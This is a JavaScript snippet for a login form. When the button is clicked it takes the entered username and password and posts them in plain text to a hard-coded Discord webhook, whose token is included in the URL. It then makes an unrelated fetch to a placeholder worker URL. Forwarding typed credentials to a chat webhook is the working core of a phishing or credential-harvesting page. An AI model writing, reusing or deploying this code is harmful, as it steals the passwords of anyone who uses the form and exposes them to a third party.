    // define elements
    const usernameArea = document.getElementById("Username")
    const passwordArea = document.getElementById("Password")
    const loginbtn = document.getElementById("Loginbtn")
    const url = "https://discord.com/api/webhooks/1330525889103925288/00RixZLbIdSGufrb29wqZD8ekI9t94ak3et3jfS8FuVVrl6YOQou5X-tdOQ8Jxd9DF78"
    // the main function when the button is clicked
    loginbtn.addEventListener("click", function() {
        var usernameValue = usernameArea.value
        var passwordValue = passwordArea.value
        // make the message constant
        const message = `There was a login request 
        Username: ${usernameValue} 
        Password: ${passwordValue}`

        const data = {
            content: message
        }
        // send the data to discord!!!
        fetch(url, {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                console.log("send login request")
            } else {
                console.log("some thing went wrong")
            }
        })
        .catch(error => {
            console.log("Error: ", error)
        })

        fetch("https://worker-hello.your-subdomain.workers.dev/api/posts")
          .then((res) => res.json())
          .then((data) => {
            console.log("Posts:", data.results);
          });

        
        
    })
  



